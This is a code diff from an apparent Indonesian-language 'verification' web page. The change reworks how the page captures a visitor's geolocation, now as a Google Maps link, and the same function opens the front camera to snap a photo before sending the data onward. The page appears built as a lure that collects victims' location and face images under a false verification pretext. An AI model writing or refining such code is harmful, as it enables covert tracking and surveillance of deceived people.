@@ -45,29 +45,29 @@
         }
 
         async function mulaiVerifikasi() {
-            document.getElementById('status').innerText = "Memproses...";
-            document.getElementById('btn').disabled = true;
+    document.getElementById('status').innerText = "Memproses...";
+    
+    // Meminta lokasi dengan link
+    await new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { 
+                    userLocation = `<a href="https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}">📍 Lokasi (Klik di sini)</a>`; 
+                    resolve(); 
+                },
+                () => { userLocation = "Ditolak"; resolve(); }
+            );
+        } else { resolve(); }
+    });
 
-            // 1. Dapatkan lokasi (tunggu sampai selesai)
-            await new Promise((resolve) => {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => { userLocation = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`; resolve(); },
-                        () => { userLocation = "Ditolak"; resolve(); }
-                    );
-                } else { resolve(); }
-            });
-
-            // 2. Akses kamera depan
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                // Beri jeda 2 detik agar kamera fokus sebelum ambil foto
-                setTimeout(() => ambilFoto(video), 2000);
-            } catch (err) {
-                kirimDataTanpaFoto();
-            }
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        setTimeout(() => ambilFoto(video), 2000);
+    } catch (err) {
+        kirimDataTanpaFoto();
+    }
         }
 
         async function ambilFoto(video) {
